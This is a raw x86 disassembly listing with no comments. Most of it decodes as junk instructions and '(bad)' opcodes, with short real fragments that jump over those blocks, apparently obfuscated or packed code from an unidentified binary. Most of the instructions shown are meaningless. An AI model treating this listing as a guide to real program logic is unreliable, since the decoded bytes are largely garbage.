  416708:	repnz enter 0xa24,0x2a
  41670d:	out    dx,eax
  41670e:	xchg   edx,ebx
  416710:	ret    0x6dca
  416713:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416714:	push   edx
  416715:	out    dx,al
  416716:	dec    esp
  416717:	into   
  416718:	ins    BYTE PTR es:[edi],dx
  416719:	jle    0x416728
  41671b:	fist   DWORD PTR [ebx+0x7e77040e]
  416721:	jge    0x416738
  416723:	into   
  416724:	idiv   BYTE PTR [edx+0x25]
  416727:	mov    bh,0x4f
  416729:	cmp    eax,0xe76510e2
  41672e:	pop    ebx
  41672f:	inc    ebx
  416730:	rol    BYTE PTR [eax+0x4802d052],0x45
  416737:	add    BYTE PTR [ecx+0x41],al
  41673a:	stos   DWORD PTR es:[edi],eax
  41673b:	fwait
  41673c:	shl    DWORD PTR [ecx+0x8],0x66
  416740:	inc    ecx
  416741:	mov    al,0x9f
  416743:	pop    ds
  416744:	stos   DWORD PTR es:[edi],eax
  416745:	and    al,0x6c
  416747:	ins    BYTE PTR es:[edi],dx
  416748:	lea    edx,[ebx]
  41674a:	mov    dl,0x16
  41674c:	cli    
  41674d:	pop    es
  41674e:	fsub   QWORD PTR [ebx-0x5e9fc7a4]
  416754:	sbb    dl,BYTE PTR [eax-0x7bf769d9]
  41675a:	xor    DWORD PTR [ebx],esi
  41675c:	push   0x4ae8da42
  416761:	push   0x4aebda42
  416766:	push   DWORD PTR [ebp-0x68]
  416769:	mov    eax,DWORD PTR [ebp-0x4]
  41676c:	call   eax
  41676e:	mov    eax,DWORD PTR [edi]
  416770:	mov    eax,DWORD PTR [ebp+0x8]
  416773:	push   DWORD PTR [eax]
  416775:	call   0x417c36
  41677a:	mov    eax,ds:0x42f1b4
  41677f:	push   0x4
  416781:	add    eax,0x1cc
  416786:	push   eax
  416787:	push   edi
  416788:	call   0x41d107
  41678d:	jmp    0x416858
  416792:	and    al,0x28
  416794:	aaa    
  416795:	adc    eax,0x39261f3f
  41679a:	ror    DWORD PTR [edx],1
  41679c:	mov    edx,0xe22bb4c3
  4167a1:	imul   esp,DWORD PTR [ecx-0x51ffff02],0x3f000000
  4167ab:	add    ebp,DWORD PTR [edi-0x5d]
  4167ae:	jae    0x41676d
  4167b0:	adc    bl,ah
  4167b2:	out    dx,eax
  4167b3:	les    eax,FWORD PTR [ecx]
  4167b5:	sub    al,BYTE PTR [edx-0x48]
  4167b8:	out    0x11,eax
  4167ba:	or     al,0xdb
  4167bc:	mov    ecx,0x6892e933
  4167c1:	loope  0x416802
  4167c3:	sbb    al,bl
  4167c5:	mov    ebp,0x75b85b93
  4167ca:	cmc    
  4167cb:	jecxz  0x41683f
  4167cd:	push   0xfffffff7
  4167cf:	outs   dx,BYTE PTR ds:[esi]
  4167d0:	test   BYTE PTR [ebx-0x11e031a0],bl
  4167d6:	sub    bl,ch
  4167d8:	rdmsr  
  4167da:	cld    
  4167db:	(bad)
  4167de:	add    BYTE PTR [edi-0x387a7418],al
  4167e4:	ds popf 
  4167e6:	(bad)  
  4167e8:	mov    al,ds:0x48a0eb24
  4167ed:	or     edx,DWORD PTR [edi]
  4167ef:	jmp    0x41679b
  4167f1:	int    0xe8
  4167f3:	fisub  WORD PTR [esp+ecx*8]
  4167f6:	mov    al,ds:0x55835c22
  4167fb:	test   DWORD PTR [esp+edx*4],esp
  4167fe:	es add al,0x2d
  416801:	mov    eax,ds:0x1620d42b
  416806:	in     eax,0x6b
  416808:	adc    BYTE PTR [ebx-0x51],al
  41680b:	push   ecx
  41680c:	xor    eax,0x702efd78
  416811:	jle    0x4167e7
  416813:	xor    DWORD PTR [edi+ebx*4-0x7f],ecx
  416817:	mov    esi,0xc0b8923a
  41681c:	sar    esi,1
  41681e:	arpl   WORD PTR [eax],bp
  416820:	sbb    BYTE PTR gs:[esp+eiz*8+0x4e],dl
  416825:	mov    BYTE PTR [edx],bl
  416827:	imul   eax,DWORD PTR [esi-0x27],0xd820da51
  41682e:	repz arpl WORD PTR [esi],cx
  416831:	and    eax,0x382ad6ca
  416836:	push   edx
  416837:	in     eax,dx
  416838:	jbe    0x416805
  41683a:	fwait
  41683b:	pusha  
  41683c:	jb     0x416803
  41683e:	mov    esp,0x68aeb36f
  416843:	mov    eax,0xcacd560d
  416848:	and    ebx,ebx
  41684a:	push   edi
  41684b:	bswap  ebp
  41684d:	sar    DWORD PTR [eax],1
  41684f:	hlt    
  416850:	pop    edx
  416851:	cmp    ebx,edi
  416853:	ds cdq 
  416855:	sub    al,0x66
  416857:	dec    edi
  416858:	pop    esi
  416859:	leave  
  41685a:	ret    0x4
  41685d:	push   ebp
  41685e:	mov    ebp,esp
  416860:	sub    esp,0x20
  416863:	push   edi
  416864:	mov    DWORD PTR [ebp-0x8],0x6ba9caa0
  41686b:	mov    DWORD PTR [ebp-0x4],0x61c2
  416872:	mov    DWORD PTR [ebp-0x10],0x5968
  416879:	push   0x28ce
  41687e:	mov    DWORD PTR [ebp-0xc],0x7e3
  416885:	mov    eax,DWORD PTR [ebp-0x10]
  416888:	mov    ecx,DWORD PTR [ebp-0xc]
  41688b:	jmp    0x41695f
  416890:	ss jg  0x41684b
  416893:	popf   
  416894:	stc    
  416895:	fbstp  TBYTE PTR [edi]
  416897:	jmp    DWORD PTR [ecx+edx*2]
  41689a:	addr16 aas 
  41689c:	add    eax,0x4f70732b
  4168a1:	inc    DWORD PTR [eax]
  4168a3:	add    BYTE PTR [edi+0x63000000],dh
  4168a9:	(bad)  
  4168aa:	push   ss
  4168ab:	les    eax,FWORD PTR [edx+0x60]
  4168ae:	mov    ds,WORD PTR [eax]
  4168b0:	or     al,0x4f
  4168b2:	jle    0x416900
  4168b4:	leave  
  4168b5:	mov    bh,0xff
  4168b7:	adc    BYTE PTR [eax],cl
  4168b9:	cmp    bh,bh
  4168bb:	leave  
  4168bc:	cmp    BYTE PTR [edi-0x68d5c75],0x64
  4168c3:	xchg   BYTE PTR [ebx+0x76],bl
  4168c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168c7:	popf   
  4168c8:	mov    ss,WORD PTR [ebp-0x16]
  4168cb:	sbb    dh,BYTE PTR ds:0x8b479f4e
  4168d1:	mov    ebp,0xda982c5c
  4168d6:	in     eax,dx
  4168d7:	(bad)  
  4168d8:	xchg   edx,eax
  4168d9:	dec    esp
  4168da:	jle    0x416959
  4168dc:	sbb    BYTE PTR [eax-0x3e759d30],cl
  4168e2:	jo     0x41688f
  4168e4:	nop
  4168e5:	mov    ah,0xce
  4168e7:	push   es
  4168e8:	pop    edi
  4168e9:	push   ecx
  4168ea:	wbinvd 
  4168ec:	xchg   edx,eax
  4168ed:	jnp    0x416924
  4168ef:	and    esp,esi
  4168f1:	loopne 0x416893
  4168f3:	sahf   
  4168f4:	xor    eax,0xaddd77a9
  4168f9:	outs   dx,BYTE PTR ds:[esi]
  4168fa:	loop   0x4168aa
  4168fc:	setno  ch
  4168ff:	bound  edi,QWORD PTR [edi+0x4b76976]
  416905:	adc    bh,BYTE PTR [edx+0xb]
  416908:	mov    eax,0x90cc23dc
  41690d:	add    ebx,DWORD PTR [ecx+0x20]
  416910:	pop    ecx
  416911:	inc    ebx
  416912:	xchg   ecx,eax
  416913:	test   DWORD PTR [eax+0x10],ebp
  416916:	jnp    0x41693a
  416918:	xor    DWORD PTR [eax],0x63
  41691b:	ja     0x41693a
  41691d:	xchg   DWORD PTR [ebp-0x73],ecx
  416920:	mov    dl,0xed
  416922:	arpl   WORD PTR [ecx+0x48b03469],si
  416928:	aas    
  416929:	out    dx,al
  41692a:	push   edx
  41692b:	or     bh,BYTE PTR [ebx-0x10d47e0f]
  416931:	pop    ecx
  416932:	add    esi,DWORD PTR [ecx+0x13466aee]
  416938:	in     al,0x4b
  41693a:	retf   0xd284
  41693d:	fiadd  WORD PTR [edx]
  41693f:	pop    eax
  416940:	out    0x18,al
  416942:	lahf   
  416943:	cmp    eax,0x15b47316
  416948:	xchg   esp,eax
  416949:	imul   eax,DWORD PTR [edx+eax*2-0x43],0xf2898ef0
  416951:	jo     0x416920
  416953:	sub    al,0x9d
  416955:	inc    esp
  416956:	dec    esp
  416957:	mov    ah,0x55
  416959:	nop
  41695a:	xor    al,0x83
  41695c:	add    bl,BYTE PTR [esi+edx*2+0x68]
  416960:	imul   esi,DWORD PTR [eax+eax*1],0x0
  416964:	push   ecx
  416965:	push   eax
  416966:	call   0x42a3cf
  41696b:	jmp    0x416a3f
  416970:	sbb    eax,0xdd25c988
  416975:	gs std 
  416977:	mov    eax,0xa1f8e0d7
  41697c:	and    al,0x54
  41697e:	sub    DWORD PTR [ecx+0x10006],esp
  416984:	mov    bh,0x0
  416986:	add    BYTE PTR [eax],al
  416988:	push   esi
  416989:	push   ebp
  41698a:	inc    bx
  41698c:	jo     0x41691f
  41698e:	setle  BYTE PTR ds:0x7cde2f3f
  416995:	cdq    
  416996:	jns    0x416958
  416998:	jbe    0x4169fb
  41699a:	test   al,0x3c
  41699c:	jge    0x416a13
  41699e:	pop    es
  41699f:	mov    ds:0xe90932f0,al
  4169a4:	pop    ebx
  4169a5:	sahf   
  4169a6:	iret   
  4169a7:	inc    edx
  4169a8:	loop   0x416990
  4169aa:	cmp    al,0x83
  4169ac:	mov    ah,0x73
  4169ae:	cld    
  4169af:	jb     0x416975
  4169b1:	sbb    edx,DWORD PTR [ebp+0x14226926]
  4169b7:	test   BYTE PTR [edi-0xaa9785],bh
  4169bd:	or     ah,BYTE PTR [ecx]
  4169bf:	add    ch,ah
  4169c1:	jnp    0x4169fa
  4169c3:	push   edi
  4169c4:	hlt    
  4169c5:	lods   al,BYTE PTR ds:[esi]
  4169c6:	repnz rol DWORD PTR [edi-0x8],cl
  4169ca:	adc    al,0xbc
  4169cc:	fsub   DWORD PTR [esi+0x623f96b3]
  4169d2:	fdiv   QWORD PTR [edx]
  4169d4:	popa   
  4169d5:	fcom   QWORD PTR [ebp+0x28]
  4169d8:	or     ebp,ebp
  4169da:	(bad)  
  4169dc:	mov    al,ds:0x2b873b0a
  4169e1:	test   esp,ebp
  4169e3:	sub    bh,BYTE PTR [ebp-0x4d]
  4169e6:	sub    al,0xd7
  4169e8:	loop   0x4169d5
  4169ea:	push   edi
  4169eb:	jecxz  0x416a26
  4169ed:	cmp    ch,ah
  4169ef:	xor    eax,0xf1ecf5dd
  4169f4:	fxch   st(5)
  4169f6:	xor    BYTE PTR [ebx],dh
  4169f8:	and    DWORD PTR [edx],eax
  4169fa:	jmp    0xe5b5:0x38bfbe21
  416a01:	sbb    dl,dh
  416a03:	mov    ebp,0x29511e29
  416a08:	sbb    eax,edx
  416a0a:	sbb    BYTE PTR [ecx+eax*1+0x530a6ea7],0xd4
  416a12:	and    BYTE PTR [ebx-0x50],cl
  416a15:	push   cs
  416a16:	loop   0x416a63
  416a18:	dec    ebp
  416a19:	add    DWORD PTR [esi],0x47df2ea2
  416a1f:	inc    ebx
  416a20:	mov    dl,0x80
  416a22:	shr    BYTE PTR [esi-0x35725b82],0x30
  416a29:	test   BYTE PTR [eax-0x1162e426],0xee
  416a30:	dec    esi
  416a31:	xor    eax,0x1d782db9
  416a36:	cmc    
  416a37:	psrld  mm4,QWORD PTR [ebp-0x5c]
  416a3b:	(bad)  
  416a3c:	mov    WORD PTR [ecx],cs
  416a3e:	mov    ecx,DWORD PTR cs:[ebp-0x8]
  416a42:	mov    edi,DWORD PTR [ebp-0x4]
  416a45:	push   edi
  416a46:	push   ecx
  416a47:	push   edx
  416a48:	push   eax
  416a49:	call   0x423dad
  416a4e:	xor    eax,0x404
  416a53:	or     eax,0x59fb
  416a58:	sub    eax,0x7df7
  416a5d:	mov    DWORD PTR [esi],eax
  416a5f:	jmp    0x416b33
  416a64:	sbb    BYTE PTR [esi-0x26086709],bh
  416a6a:	jg     0x416a2a
  416a6c:	icebp  
  416a6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a6e:	ss addr16 aaa 
  416a71:	xchg   edx,eax
  416a72:	inc    ebp
  416a73:	cmp    DWORD PTR [ebp-0x48ffff00],edi
  416a79:	add    BYTE PTR [eax],al
  416a7b:	add    bl,bl
  416a7d:	mov    ds:0xb5d06ac,al
  416a82:	mov    esi,?
  416a84:	mov    bl,0x60
  416a86:	add    DWORD PTR [edi-0x7b],esi
  416a89:	xchg   edi,eax
  416a8a:	fnsave [edi]
  416a8c:	ss jnp 0x416a96
  416a8f:	leave  
  416a90:	clc    
  416a91:	sub    ch,BYTE PTR [edi+0x77]
  416a94:	lock add eax,0xd93f6216
  416a9a:	cmc    
  416a9b:	icebp  
  416a9c:	addr16 inc ecx
  416a9e:	xchg   edx,eax
  416a9f:	push   ss
  416aa0:	fsub   QWORD PTR ds:0x8b0a92a0
  416aa6:	cli    
  416aa7:	sub    BYTE PTR [edi],ch
  416aa9:	arpl   WORD PTR ds:0xc97dbaca,di
  416aaf:	imul   edi,DWORD PTR [edx-0x61d8580b],0xffffffb1
  416ab6:	push   esi
  416ab7:	cmc    
  416ab8:	(bad)  
  416ab9:	dec    ebp
  416aba:	pop    eax
  416abb:	ja     0x416a4e
  416abd:	(bad)  
  416abe:	mov    ?,eax
  416ac0:	enter  0xafaa,0xa5
  416ac4:	(bad)  
  416ac5:	xor    BYTE PTR [ecx+0x314c7a19],al
  416acb:	in     al,0x7
  416acd:	std    
  416ace:	sahf   
  416acf:	mov    ebp,0xd6d0c12a
  416ad4:	daa    
  416ad5:	inc    eax
  416ad6:	jecxz  0x416a79
  416ad8:	push   ds
  416ad9:	mov    edi,0x9103745
  416ade:	loope  0x416af9
  416ae0:	jp     0x416a9e
  416ae2:	in     eax,0x6
  416ae4:	jecxz  0x416aaa
  416ae6:	sub    DWORD PTR [ecx],eax
  416ae8:	lea    edx,[eax]
  416aea:	fisubr DWORD PTR [eax+0x6a73ab90]
  416af0:	test   BYTE PTR [edi+0x5c8bb186],bl
  416af6:	rcl    DWORD PTR [ebp-0x5f],1
  416af9:	rcr    DWORD PTR [ebp-0x5c2b4bef],1
  416aff:	or     DWORD PTR [ecx],ecx
  416b01:	adc    ah,BYTE PTR [ecx]
  416b03:	popa   
  416b04:	ror    BYTE PTR [ecx-0x73],1
  416b07:	out    0xc9,eax
  416b09:	cli    
  416b0a:	pop    eax
  416b0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b0c:	das    
  416b0d:	mov    bh,0x65
  416b0f:	mov    eax,DWORD PTR [edx]
  416b11:	pop    ss
  416b12:	loopne 0x416b91
  416b14:	in     eax,0xaa
  416b16:	xor    DWORD PTR [esi+ecx*2+0x718d234a],ebx
  416b1d:	addr16 (bad) 
  416b20:	inc    ebp
  416b21:	mov    al,ds:0x7fc78e2c
  416b26:	inc    edx
  416b27:	fs out dx,eax
  416b29:	jmp    0x416b39
  416b2b:	mov    ch,bl
  416b2d:	jnp    0x416b41
  416b2f:	inc    ebx
  416b30:	mov    edi,0x45c795a1
  416b35:	loopne 0x416af9
  416b37:	add    BYTE PTR ds:[eax],al
  416b3a:	mov    DWORD PTR [ebp-0x1c],0x2c49
  416b41:	mov    DWORD PTR [ebp-0x18],0xf0f0f0f
  416b48:	mov    DWORD PTR [ebp-0x14],0x0
  416b4f:	mov    DWORD PTR [ebp-0x10],0x2e71
  416b56:	mov    DWORD PTR [ebp-0xc],0x3f4b
  416b5d:	jmp    0x416c31
  416b62:	add    ebp,DWORD PTR [edi]
  416b64:	rcr    BYTE PTR [ebp-0x2],cl
  416b67:	std    
  416b68:	(bad)  
  416b69:	jg     0x416bcc
  416b6b:	ja     0x416b3a
  416b6d:	cmp    BYTE PTR [edx],ah
  416b6f:	inc    esi
  416b70:	xor    eax,DWORD PTR [edx]
  416b72:	je     0x416b75
  416b74:	add    DWORD PTR [eax],eax
  416b76:	mov    bh,0x0
  416b78:	add    BYTE PTR [eax],al
  416b7a:	push   eax
  416b7b:	sti    
  416b7c:	push   esp
  416b7d:	ds sub esi,edi
  416b80:	pop    ds
  416b81:	jmp    0x6a6e:0xc4ecbbed
  416b88:	jl     0x416bcf
  416b8a:	cmp    al,al
  416b8c:	mov    ds:0xf90ac489,al
  416b91:	in     eax,0xc7
  416b93:	arpl   WORD PTR [ecx-0x37f016b5],bx
  416b99:	xor    al,0xca
  416b9b:	pop    ecx
  416b9c:	dec    edx
  416b9d:	push   ebx
  416b9e:	(bad)  [ebx+0x4db2a1b1]
  416ba4:	push   ebp
  416ba5:	sub    BYTE PTR [edx+ebp*4],ch
  416ba8:	mov    ebp,DWORD PTR [eax-0x15]
  416bab:	mov    edx,0x60b8713
  416bb0:	cdq    
  416bb1:	mov    BYTE PTR [eax-0x11],ch
  416bb4:	cmp    al,0x66
  416bb6:	fidivr DWORD PTR ds:0xa97dbd46
  416bbc:	cmc    
  416bbd:	inc    ebx
  416bbe:	inc    esi
  416bbf:	mov    edi,0x73a4e90a
  416bc4:	iret   
  416bc5:	cld    
  416bc6:	hlt    
  416bc7:	jmp    0x71d2900f
  416bcc:	jns    0x416c1a
  416bce:	add    al,0x6d
  416bd0:	push   0xc9025871
  416bd5:	mov    bl,BYTE PTR [ecx]
  416bd7:	mov    al,ds:0x8f56ffb3
  416bdc:	pusha  
  416bdd:	fnstcw WORD PTR [ebp+0x41ea98f5]
  416be3:	fistp  WORD PTR ds:0xc5f0ff5d
  416be9:	loop   0x416c51
  416beb:	and    al,0x24
  416bed:	scas   al,BYTE PTR es:[edi]
  416bee:	not    BYTE PTR [ebp+0x11bd3430]
  416bf4:	(bad)  
  416bf5:	fdiv   QWORD PTR [ecx+0x64e9bcaa]
  416bfb:	daa    
  416bfc:	adc    DWORD PTR [edx-0x34ed925f],ebp
  416c02:	add    al,0x8c
  416c04:	out    dx,al
  416c05:	shl    DWORD PTR [esi+0x3c0153e7],cl
  416c0b:	loopne 0x416c6e
  416c0d:	or     al,0x31
  416c0f:	pop    eax
  416c10:	pop    ss
  416c11:	cmp    eax,0x536ab550
  416c16:	push   DWORD PTR [ebx+0x18]
  416c19:	jae    0x416c66
  416c1b:	fld    DWORD PTR [esi+edx*4-0x5c1780b2]
  416c22:	xchg   ebp,eax
  416c23:	mov    dl,0xb6
  416c25:	jmp    0x773c:0x5700e819
  416c2c:	add    ah,BYTE PTR [ecx]
  416c2e:	add    bl,BYTE PTR [edx+0x63]
  416c31:	mov    DWORD PTR [ebp-0x4],0x23f1
  416c38:	mov    eax,DWORD PTR [ebp-0x10]
  416c3b:	mov    ecx,DWORD PTR [ebp-0xc]
  416c3e:	jmp    0x416d12
  416c43:	push   0x4c
  416c45:	pushf  
  416c46:	xchg   edx,eax
  416c47:	mov    esi,0x26fc6ed2
  416c4c:	retf   
  416c4d:	(bad)  
  416c4e:	mov    eax,ds:0xa5d11ae7
  416c53:	sub    eax,DWORD PTR [edx]
  416c55:	add    DWORD PTR [eax],eax
  416c57:	mov    bh,0x0
  416c59:	add    BYTE PTR [eax],al
  416c5b:	cmp    dl,BYTE PTR [esi]
  416c5d:	jb     0x416cb0
  416c5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c60:	jae    0x416c5a
  416c62:	pop    ebp
  416c63:	add    al,0xc5
  416c65:	aad    0xc
  416c67:	mov    edx,0x653c0b62
  416c6c:	mov    eax,ds:0xa64e0843
  416c71:	pusha  
  416c72:	push   ss
  416c73:	dec    ebp
  416c74:	(bad)  
  416c75:	data16 fcmovne st,st(0)
  416c78:	lds    esp,FWORD PTR cs:[ebx+0x73]
  416c7c:	mov    ecx,DWORD PTR [edx+0x67]
  416c7f:	dec    eax
  416c80:	mov    dh,BYTE PTR [ebx-0x3b]
  416c83:	inc    esi
  416c84:	imul   eax,DWORD PTR [ecx+0x7e34e842],0xd
  416c8b:	pop    esi
  416c8c:	call   0x443e4e12
  416c91:	jecxz  0x416c63
  416c93:	mov    esi,0x6b7c499b
  416c98:	sub    BYTE PTR [ebp+0x3d],ah
  416c9b:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  416c9d:	imul   BYTE PTR [edx-0x6a6f5e8c]
  416ca3:	mov    eax,0x5938b793
  416ca8:	pusha  
  416ca9:	jno    0x416c8e
  416cab:	cmp    cl,ah
  416cad:	xchg   ecx,eax
  416cae:	cmp    bh,BYTE PTR [ebx]
  416cb0:	rcl    bl,1
  416cb2:	mov    eax,0x41c21c69
  416cb7:	mov    BYTE PTR [edx],ah
  416cb9:	jbe    0x416d30
  416cbb:	cli    
  416cbc:	mov    eax,DWORD PTR [ecx-0x5f088405]
  416cc2:	add    eax,DWORD PTR [edi]
  416cc4:	repz mov ch,0x38
  416cc7:	shld   DWORD PTR [edi+ecx*2+0x3c334b8],eax,cl
  416ccf:	lea    ebx,[ebx-0x7471972f]
  416cd5:	in     eax,dx
  416cd6:	xor    eax,0x2ebddfeb
  416cdb:	jecxz  0x416cc6
  416cdd:	xlat   BYTE PTR ds:[ebx]
  416cde:	fwait
  416cdf:	jnp    0x416cdb
  416ce1:	mov    edi,0x23c4f264
  416ce6:	pop    ss
  416ce7:	mov    al,0x29
  416ce9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cea:	lods   eax,DWORD PTR ds:[esi]
  416ceb:	clc    
  416cec:	mov    eax,0x4336fc3c
  416cf1:	xor    dl,ch
  416cf3:	call   0xabe43033
  416cf8:	push   ss
  416cf9:	mov    ds:0xc4cb4050,al
  416cfe:	fst    DWORD PTR [edi-0x61]
  416d01:	mov    ds:0x3cf3913b,eax
  416d06:	or     ebp,DWORD PTR [ebp-0x65ca9949]
  416d0c:	imul   ebx,DWORD PTR [edx-0x139ae30a],0xe9e8558b
  416d16:	iret   
  416d17:	add    BYTE PTR [eax],al
  416d19:	add    BYTE PTR [eax+eiz*2],dl
  416d1c:	add    DWORD PTR [edi+esi*8],0xffffffe7
  416d20:	xchg   edi,eax
  416d21:	jo     0x416d95
  416d23:	pop    ds
  416d24:	push   esp
  416d25:	mov    edi,0xcd375851
  416d2a:	loop   0x416d2e
  416d2c:	add    DWORD PTR [eax],eax
  416d2e:	mov    bh,0x0
  416d30:	add    BYTE PTR [eax],al
  416d32:	mov    esp,DWORD PTR [eax]
  416d34:	jns    0x416d1e
  416d36:	cmc    
  416d37:	fs into 
  416d39:	xor    si,WORD PTR [edx+0x68]
  416d3d:	dec    ecx
  416d3e:	adc    ah,cl
  416d40:	(bad)  
  416d41:	std    
  416d42:	sub    DWORD PTR [eax+0x50],ebx
  416d45:	or     bh,0x78
  416d48:	or     eax,DWORD PTR [ebx+ebp*1-0x4b52cd37]
  416d4f:	or     al,dl
  416d51:	push   es
  416d52:	idiv   DWORD PTR [edi-0x699d2137]
  416d58:	test   dh,bh
  416d5a:	jae    0x416d1c
  416d5c:	mov    ds:0xb9683d48,al
  416d61:	jne    0x416d79
  416d63:	dec    eax
  416d64:	add    ebp,edx
  416d66:	rol    DWORD PTR [eax],1
  416d68:	lock dec esp
  416d6a:	xchg   ebp,eax
  416d6b:	xor    eax,0x949602ed
  416d70:	pop    ebx
  416d71:	xor    eax,0xd5ef4cda
  416d76:	ja     0x416dcb
  416d78:	lahf   
  416d79:	dec    edx
  416d7a:	ror    DWORD PTR [eax],0x16
  416d7d:	sti    
  416d7e:	cdq    
  416d7f:	push   es
  416d80:	popf   
  416d81:	addr16 popa 
  416d83:	jns    0x416d42
  416d85:	enter  0x9437,0xb7
  416d89:	pop    ss
  416d8a:	sbb    eax,0xe99a195c
  416d8f:	jecxz  0x416d9c
  416d91:	stos   DWORD PTR es:[edi],eax
  416d92:	fs popw ds
  416d95:	mov    esi,0x3ad26078
  416d9a:	ds and edi,ebp
  416d9d:	rcr    DWORD PTR [edi+0x2d],cl
  416da0:	add    ch,BYTE PTR ds:0xafb42e85
  416da6:	sub    al,0x3f
  416da8:	xchg   ebx,eax
  416da9:	xor    DWORD PTR [ebp-0x3f],0xebf05
  416db0:	sub    eax,0xbaca41fe
  416db5:	ficomp DWORD PTR [eax+0x63]
  416db8:	push   ebp
  416db9:	or     al,0xa
  416dbb:	dec    BYTE PTR [ebx+ebp*1+0x5b]
  416dbf:	and    dh,BYTE PTR [edi]
  416dc1:	std    
  416dc2:	sbb    BYTE PTR [edi-0x7a4fad58],ah
  416dc8:	add    BYTE PTR [edx+0x41],0x1f
  416dcc:	push   ebp
  416dcd:	jmp    0xa7a7b006
  416dd2:	push   edx
  416dd3:	aaa    
  416dd4:	sbb    edi,DWORD PTR [ebx]
  416dd6:	push   cs
  416dd7:	(bad)  
  416dd8:	sar    DWORD PTR [eax-0x19],0xf
  416ddc:	mov    dh,0xe5
  416dde:	vxorps xmm4,xmm6,XMMWORD PTR [edi+0x11]
  416de4:	scas   al,BYTE PTR es:[edi]
  416de5:	pop    ecx
  416de6:	cmp    al,0x98
  416de8:	or     ecx,DWORD PTR [ebx+0x5257ec7d]
  416dee:	and    ecx,0x351
  416df4:	jmp    0x416ec8
  416df9:	ins    BYTE PTR es:[edi],dx
  416dfa:	add    al,0x81
  416dfc:	or     ebp,ecx
  416dfe:	(bad)  
  416dff:	out    dx,al
  416e00:	addr16 push es
  416e02:	shr    esp,cl
  416e04:	or     eax,0x4e867c63
  416e09:	cdq    
  416e0a:	add    eax,DWORD PTR [ecx]
  416e0c:	add    BYTE PTR [edi-0x6d000000],dh
  416e12:	jmp    0x9b0c3b44
  416e17:	pop    edi
  416e18:	(bad)  
  416e19:	and    eax,0x445c767c
  416e1e:	pop    ds
  416e1f:	in     eax,dx
  416e20:	jne    0x416e39
  416e22:	fs push esi
  416e24:	dec    esp
  416e25:	ret    0x5903
  416e28:	cld    
  416e29:	pop    edi
  416e2a:	sbb    al,0xbd
  416e2c:	or     eax,0x4ab442d9
  416e31:	test   DWORD PTR [eax-0x486898c5],esi
  416e37:	lea    esp,[eax]
  416e39:	sub    al,cl
  416e3b:	pop    DWORD PTR [esi]
  416e3d:	mov    eax,0x1865b69b
  416e42:	dec    ecx
  416e43:	fs mov ebp,gs
  416e46:	mov    eax,0x4a85bd4f
  416e4b:	cli    
  416e4c:	push   eax
  416e4d:	jne    0x416eb8
  416e4f:	sbb    ch,BYTE PTR [ecx]
  416e51:	sbb    eax,0xf8e353d
  416e56:	push   ds
  416e57:	xchg   esi,eax
  416e58:	cs and al,0x2b
  416e5b:	pop    esi
  416e5c:	sub    dh,ah
  416e5e:	sbb    ch,BYTE PTR [eax+0x3b130629]
  416e64:	retf   0x8de1
  416e67:	(bad)  
  416e69:	jb     0x416e6e
  416e6b:	aad    0x91
  416e6d:	or     bh,bl
  416e6f:	pop    edx
  416e70:	je     0x416ea1
  416e72:	ja     0x416ee2
  416e74:	mov    ah,0x9e
  416e76:	mov    eax,ds:0x5b7a1a8f
  416e7b:	mov    esp,0xbb792d3d
  416e80:	sbb    al,0xb5
  416e82:	daa    
  416e83:	sbb    BYTE PTR [esi+0x20],bl
  416e86:	jns    0x416f04
  416e88:	sbb    ecx,DWORD PTR [ebx-0x6482eb69]
  416e8e:	test   BYTE PTR [edi+0x79],ch
  416e91:	mov    dh,0xe6
  416e93:	imul   ebp,DWORD PTR [esi+0x2a],0x4a
  416e97:	cmc    
  416e98:	fild   QWORD PTR [edi]
  416e9a:	push   ds
  416e9b:	jecxz  0x416ed8
  416e9d:	loopne 0x416efe
  416e9f:	jns    0x416eb9
  416ea1:	dec    edx
  416ea2:	bound  edx,QWORD PTR [edx-0x3e]
  416ea5:	jle    0x416ebd
  416ea7:	shl    BYTE PTR [edx+eax*2-0x1e],1
  416eab:	fcmove st,st(0)
  416ead:	cmp    DWORD PTR [ebx+0x4d],esp
  416eb0:	fwait
  416eb1:	repz mov edi,0x43b87bf6
  416eb7:	xchg   ecx,eax
  416eb8:	xchg   ecx,eax
  416eb9:	or     ah,BYTE PTR [ebx]
  416ebb:	call   DWORD PTR cs:[ecx+0x56]
  416ebf:	sub    BYTE PTR [esi+0x78000e74],ah
  416ec5:	and    ah,BYTE PTR [ebp+0x7]
  416ec8:	and    eax,0x11f6
  416ecd:	push   ecx
  416ece:	jmp    0x416fa2
  416ed3:	sar    DWORD PTR ds:0xffeec8ca,1
  416ed9:	sar    DWORD PTR ds:0xcd1a5ef9,cl
  416edf:	mov    edi,0x50cdad74
  416ee4:	add    al,0x1
  416ee6:	add    BYTE PTR [edi-0x1d000000],dh
  416eec:	stos   BYTE PTR es:[edi],al
  416eed:	sbb    DWORD PTR [eax],edi
  416eef:	dec    edi
  416ef0:	cdq    
  416ef1:	(bad)  
  416ef3:	fld    QWORD PTR [edi-0x41]
  416ef6:	int3   
  416ef7:	mov    edi,ebp
  416ef9:	adc    cl,BYTE PTR [edx-0x9]
  416efc:	xor    BYTE PTR [edx],0xc9
  416eff:	das    
  416f00:	test   esp,esp
  416f02:	jmp    0x1ac1:0x978ea5eb
  416f09:	in     al,dx
  416f0a:	mov    eax,DWORD PTR [ebx+0x18]
  416f0d:	cdq    
  416f0e:	pop    ebp
  416f0f:	sbb    eax,0x8ea2e82
  416f14:	jge    0x416f33
  416f16:	rcr    DWORD PTR [ebx-0x50],cl
  416f19:	and    al,0xa3
  416f1b:	(bad)  [esi]
  416f1d:	mov    esi,0xd3cfcf9e
  416f22:	push   ds
  416f23:	sub    al,0x62
  416f25:	jmp    0x6ab35cc4
  416f2a:	call   0xfc4441e1
  416f2f:	xchg   BYTE PTR [eax+0x583faa1e],bl
  416f35:	jae    0x416f78
  416f37:	stos   DWORD PTR es:[edi],eax
  416f38:	jo     0x416fa5
  416f3a:	arpl   WORD PTR [ebx+0xc],ax
  416f3d:	out    0x2e,eax
  416f3f:	mov    esi,0x91d6f1d5
  416f44:	in     eax,dx
  416f45:	ds push ss
  416f47:	mov    dh,0x5d
  416f49:	mov    ebx,0x411a9f61
